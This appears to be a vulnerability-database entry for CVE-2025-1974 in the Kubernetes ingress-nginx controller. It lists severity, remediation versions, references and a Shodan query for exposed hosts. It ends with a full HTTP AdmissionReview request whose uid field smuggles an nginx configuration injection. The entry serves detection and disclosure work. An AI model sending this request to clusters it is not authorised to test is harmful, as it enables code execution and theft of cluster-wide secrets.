---
layout: "post"
cve_id: "CVE-2025-1974"
title: "Ingress-Nginx Controller - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2025/CVE-2025-1974.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-1974.yaml"
author: "iamnoooob,rootxharsh,pdresearch,UNC1739"
severity: "critical"
impact: "Vulnerable versions of Ingress-Nginx controller can be exploited to gain unauthorized access to all secrets across namespaces in the Kubernetes cluster, potentially leading to complete cluster takeover.
"
remediation: "Update to one of the following versions: Version 1.12.1 or later / Version 1.11.5 or later
"
reference:
  - "https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities"
  - "https://projectdiscovery.io/blog/ingressnightmare-unauth-rce-in-ingress-nginx"
  - "https://nvd.nist.gov/vuln/detail/CVE-2025-1974"
  - "https://https://github.com/kubernetes/kubernetes/issues/131009"
  - "https://github.com/eeeeeeeeee-code/POC"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2025-1974', 'cwe-id': 'CWE-653', 'epss-score': 0.91853, 'epss-percentile': 0.99673}"
metadata: "{'verified': True, 'max-request': 1, 'shodan-query': 'ssl:"ingress-nginx" port:8443'}"
tags:
  - "cve"
  - "cve2025"
  - "cloud"
  - "devops"
  - "kubernetes"
  - "ingress"
  - "nginx"
  - "k8s"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A security issue was discovered in Kubernetes where under certain conditions, an unauthenticated attacker with access to the pod network can achieve arbitrary code execution in the context of the ingress-nginx controller. This can lead to disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)


## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Connection: close
Content-Length: 2013
Content-Type: application/json
Accept-Encoding: gzip

{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "38bcmdorxp3gdbyxyit5ommhgmo",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "test-38BCmDoRxP3GdBYxYit5ommHgmO",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {
      "uid": "38bcmdorxp3gdbyxyit5ommhgmo"
    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "test-38BCmDoRxP3GdBYxYit5ommHgmO",
        "namespace": "default",
        "creationTimestamp": null,
        "uid": "InjectTest#;\n\n}\n}\n}\nload_module test;",
        "annotations": {
          "nginx.ingress.kubernetes.io/mirror-target": "fake-mirror-target"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "test.example.com",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "kubernetes",
                      "port": {
                        "number": 443
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
```

